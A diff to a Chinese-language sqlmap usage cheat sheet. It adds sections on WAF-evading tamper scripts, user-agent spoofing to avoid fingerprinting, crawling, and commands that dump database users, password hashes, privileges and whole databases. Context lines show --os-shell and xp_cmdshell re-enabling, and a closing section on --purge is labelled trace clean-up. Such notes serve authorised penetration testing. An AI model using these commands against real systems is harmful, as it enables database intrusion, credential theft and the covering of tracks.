@@ -10,9 +10,9 @@
   * [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
   * sqlmap相关代码实现参考的白皮书(2009年) [Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf](https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf)
 
+### 参数讲解
 
-
-### tamper详解
+#### 常用参数 - tamper详解
 
 tampers是sqlmap自带的绕过WAF的脚本，可查看所有tampers:
 
@@ -20,9 +20,7 @@ tampers是sqlmap自带的绕过WAF的脚本，可查看所有tampers:
 
 2019.2.15 我更新并总结了 [tamper脚本分类汇总 sqlmap_tamper.csv](files/sqlmap_tamper.csv) 
 
-可根据实际情况中的 数据库类型 选择合适的tamper(或自写脚本)实现绕过WAF进行SQL注入
-
-### 参数讲解
+可根据 被拦截原因 数据库类型 等. 选择合适的tamper(或自写脚本)实现绕过WAF.
 
 官方文档 [sqlmap Wiki - 参数功能的解释](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 
@@ -36,7 +34,7 @@ tampers是sqlmap自带的绕过WAF的脚本，可查看所有tampers:
 >另一种不太通用的办法:手工修改请求
 >把Host头最后加上`:443`可被sqlmap识别为ssl协议,这种办法一般可行但有局限性. 实测中有8443端口的SSL端口，如果在Host头最后加上`:8443`，仍然会被sqlmap当作HTTP协议的端口
 
-#### 常用参数 - 加快测试速度
+#### 常用参数 - 加快速度 - 指定数据库类型
 
 指定数据库类型
 ```
@@ -45,7 +43,35 @@ tampers是sqlmap自带的绕过WAF的脚本，可查看所有tampers:
 --dbms "Microsoft Access"
 ```
 
-#### 常用参数 - 降低测试速度
+#### 常用参数 - 加快速度 - 指定注入类型
+
+```
+--tech U
+--technique T
+```
+
+```
+B: Boolean-based blind
+E: Error-based
+U: Union query-based
+S: Stacked queries
+T: Time-based blind
+Q: Inline queries
+```
+
+#### 常用参数 - 加快速度 - 指定盲注时测试哪些字符
+
+```
+--charset="0123456789abcdef"
+```
+
+适用类型: boolean-based blind SQL injection 或 time-based blind SQL injection
+
+描述:在基于布尔的盲SQL注入,或基于时间的盲SQL注入中,用户可以强制使用自定义字符集来加速数据获取过程.
+
+例如,如果dump的数据是"信息摘要"(message digest) MD5,SHA1等,使用`--charset="0123456789abcdef"`的请求数量 仅为正常运行时请求数量的70%
+
+#### 常用参数 - 降低速度 - delay
 
 设置每两次HTTP(S)request之间的时间间隔. 以秒为单位. float类型.
 
@@ -66,12 +92,30 @@ tampers是sqlmap自带的绕过WAF的脚本，可查看所有tampers:
 
 #### 常用参数 - 设置user-agent避免指纹
 
-随机user-agent
+指定user-agent (随机UA)
 ```
 --random-agent
 ```
 
-安卓手机user-agent
+指定user-agent (移动设备UA)
+```
+--mobile
+
+which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
+[1] Apple iPhone 8 (default)
+[2] BlackBerry Z10
+[3] Google Nexus 7
+[4] Google Pixel
+[5] HP iPAQ 6365
+[6] HTC 10
+[7] Huawei P8
+[8] Microsoft Lumia 950
+[9] Nokia N97
+[10] Samsung Galaxy S7
+[11] Xiaomi Mi 3
+```
+
+指定user-agent (任意UA)
 ```
 --user-agent "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 ```
@@ -89,30 +133,132 @@ User-Agent: Mozilla/4.0
 id=1
 ```
 
+#### 常用参数 - 爬取
+
+```
+--crawl=3
+```
+设置爬取深度.
+
+```shell
+req1.txt中的URL为:
+http://192.168.0.1/web/
+
+python sqlmap.py -r req1.txt --batch --crawl=3
+[...]
+[xx:xx:53] [INFO] starting crawler
+[xx:xx:53] [INFO] searching for links with depth 1
+[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while
+[xx:xx:53] [INFO] searching for links with depth 2
+[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'
+[xx:xx:00] [INFO] 42/56 links visited (75%)
+[...]
+```
+
 #### 常用参数 - 用*标记注入点
 
 针对情况：伪静态 等sqlmap不能自动识别的格式
 
 ```
-sqlmap -u xxx.com/index.php/Index/view/id/40*.html --dbs
+python sqlmap.py -u xxx.com/index.php/Index/view/id/40*.html --dbs
 ```
 
 -r 也是在请求包文件中的参数值后面加*号
 
-#### 参数 - 指定注入技术类型
+
+#### 常用参数 - 删除session文件
 
 ```
---tech U
---technique T
+--flush-session
 ```
 
-```
-B: Boolean-based blind
-E: Error-based
-U: Union query-based
-S: Stacked queries
-T: Time-based blind
-Q: Inline queries
+在一次成功获取数据后,想再次获取最新的数据,就可以用这个参数.
+
+提示:仅会在数据文件夹中删除 这个文件夹 /xx.com/ 中的几乎所有信息,除了已经获取并保存为`results-xxxx.csv`的文件,它们会被重命名为`results-xxxx.csv1`
+
+#### 常用参数 - 基本信息获取
+
+```shell
+
+# ------------
+
+# 获取目标主机的hostname
+--hostname
+
+# ------------
+
+# 获取当前"数据库"的名称
+--current-db
+
+# 获取当前使用的"数据库用户" 用户名
+--current-user
+
+# 判断当前"数据库用户"是否为DBA
+--is-dba
+
+# 获取全部"数据库"的名称
+--dbs
+
+# 获取几乎全部"数据库"的名称,全部表的名称,全部字段 "字段名" "字段类型". 排除"系统数据库"
+--schema --exclude-sysdbs
+
+# 获取全部"数据库用户"
+--users
+
+# 获取全部"数据库用户" 及其口令
+--passwords
+
+# 获取全部"数据库用户" 及其权限(是否为DBA)
+--privileges
+
+
+# 获取指定数据库内的每个表 有多少条记录
+--count -D testdb
+
+[...]
+Database: testdb
++----------------+---------+
+| Table          | Entries |
++----------------+---------+
+| dbo.users      | 4       |
+| dbo.users_blob | 2       |
++----------------+---------+
+
+# ------------
+
+# 获取表名 - 获取指定、部分、全部"数据库"的所有表的名称
+
+# 获取全部数据库的表
+--tables
+
+# 获取几乎全部数据库的表. 排除"系统数据库"
+--tables --exclude-sysdbs
+
+# 获取指定数据库的表
+--tables -D users
+
+# ------------
+
+# 获取字段名 - 获取指定、部分、全部"数据库"、"表"的所有字段的名称
+
+# 获取指定数据库(不用-D则默认当前数据库)、指定表的全部字段 "字段名" "字段类型"
+--columns -D testdb -T users -C name
+
+# ------------
+
+# 获取数据 - 获取 指定"数据库" 的全部数据
+--dump -D testdb
+
+# 获取数据 - 获取 指定"表" 的全部数据
+--dump -T users
+
+# 获取数据 - 获取 指定"表" 的指定数据
+--dump -T users -C last_ip,last_time
+
+
+# 获取数据 - 获取 几乎全部数据. 排除"系统数据库"
+#【请求多 耗时多】
+--dump-all --exclude-sysdbs
 ```
 
 #### 参数 - 交互式sql语句执行
@@ -154,6 +300,29 @@ sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "MySQL" --os-shell
       * 如果`xp_cmdshell`存储过程 被禁用(Microsoft SQL Server >= 2005 默认禁用)sqlmap会重新启用它
       * 如果`xp_cmdshell`存储过程 不存在 则从头开始创建它
 
+
+#### 参数 - 痕迹清理
+
+```
+--purge
+```
+
+安全删除 数据文件夹`$HOME/.local/share/sqlmap`下所有获取到的数据.
+ 
+数据文件夹 (子)目录中的所有文件将被随机数据覆盖.文件名也会随机覆盖.
+
+```
+python sqlmap.py --purge -v 3
+[...]
+[xx:xx:55] [INFO] purging content of directory '/home/testuser/.local/share/sqlmap'...
+[xx:xx:55] [DEBUG] changing file attributes
+[xx:xx:55] [DEBUG] writing random data to files
+[xx:xx:55] [DEBUG] truncating files
+[xx:xx:55] [DEBUG] renaming filenames to random values
+[xx:xx:55] [DEBUG] renaming directory names to random values
+[xx:xx:55] [DEBUG] deleting the whole directory tree
+[...]
+```
 
 ### 案例1
 
